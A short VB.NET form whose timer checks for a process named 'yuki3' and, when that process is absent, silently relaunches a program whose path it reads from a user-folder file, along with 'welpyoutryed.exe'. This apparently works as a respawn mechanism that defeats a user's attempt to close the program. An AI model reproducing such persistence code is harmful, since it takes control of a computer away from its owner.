Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim p() As Process

        p = Process.GetProcessesByName("yuki3")
        If p.Count > 0 Then


        Else

            Try
                Dim fileReader As String
                fileReader = My.Computer.FileSystem.ReadAllText("C:\Users\" & SystemInformation.UserName & "\path.yuki")
                Process.Start(fileReader)
            Catch ex As Exception

            End Try
            Try
                If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\path.yuki") Then
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                End If

            Catch ex As Exception

            End Try

        End If
    End Sub
End Class
